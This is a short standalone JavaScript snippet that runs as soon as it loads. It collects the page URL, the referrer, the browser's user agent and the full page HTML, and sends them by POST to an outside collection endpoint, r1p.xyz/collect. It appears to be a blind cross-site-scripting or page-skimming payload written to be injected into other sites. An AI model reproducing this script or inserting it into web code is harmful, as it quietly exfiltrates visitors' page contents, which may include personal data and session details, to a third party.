(async function() {
    const currentUrl = window.location.href;
    const referer = document.referrer;
    const userAgent = navigator.userAgent;
    const pageContent = document.documentElement.outerHTML;

        const postData = {
            currentUrl,
            referer,
            userAgent,
            pageContent: encodeURIComponent(pageContent)
        };

        await fetch('https://r1p.xyz/collect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(postData),
            mode: 'no-cors'
        });
})();
